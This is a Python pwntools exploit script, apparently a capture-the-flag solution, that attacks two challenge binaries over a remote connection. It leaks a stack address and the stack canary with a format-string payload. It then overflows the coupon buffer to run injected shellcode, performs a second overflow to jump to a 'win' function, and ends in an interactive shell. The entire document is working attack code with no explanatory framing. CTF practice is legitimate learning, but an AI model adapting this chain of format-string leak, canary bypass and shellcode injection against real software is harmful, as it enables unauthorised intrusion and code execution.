from pwn import *
import subprocess as sb

BINARY = "chall"
BINARY2 = "opt/worker"
context.binary = BINARY
elf = context.binary
elf2 = ELF(BINARY2)

p = "pwn_variable"

def enter_choice(ch):
    global p
    p.sendlineafter(b"Enter your choice: ", str(ch).encode())

def enter_coupon(code):
    global p
    p.sendlineafter(b"Enter the coupon code: ", code)

def get_another_chance():
    global p
    while(1):
        enter_choice(1)
        p.recvline()
        result = p.recvline().strip().decode()
        if "You get another chance to enter the coupon!" in result:
            break
    
def first_pwn():
    global p
    # p = ELF.process()
    p = remote("34.76.206.46", 10006)

    RSP_TO_COUPON_ADDR = 8
    RSP_TO_CANARY = 216
    INPUT_TO_COUPON = 96
    OFFSET = 208

    sb.run("./shellcode_compile.sh shellcode.s", shell=True)
    shellcode = open("shellcode.bin","rb").read().strip()
    sb.run("rm -rf ./shellcode.bin", shell=True)

    get_another_chance()
    enter_choice(2)

    payload = f"%{RSP_TO_COUPON_ADDR//8 + 6}$p.%{RSP_TO_CANARY//8 + 6}$p".encode()
    enter_coupon(payload)

    p.recvuntil(b"Invalid coupon code! You entered: ")
    ADDRESS, CANARY = p.recvline().decode().strip().split('.')
    log.info(f"Address of coupon buffer -> {ADDRESS}")
    log.info(f"Canary -> {CANARY}")
    ADDRESS = int(ADDRESS, 16)
    CANARY = int(CANARY, 16)

    payload = b""
    payload += shellcode + b"\x00"
    payload += cyclic(INPUT_TO_COUPON-len(payload))
    payload += shellcode + b"\x00"
    payload += cyclic(OFFSET-8-len(payload))
    payload += p64(CANARY)
    payload += cyclic(8)
    payload += p64(ADDRESS)

    enter_coupon(payload)

def second_pwn():
    global p
    p.sendlineafter(b"enter your number:\n", b"1")

    payload = cyclic(88)
    payload += p64(elf2.symbols["win"])

    p.recvuntil(b"enter your name:\n")
    p.send(payload)

first_pwn()
second_pwn()
p.interactive()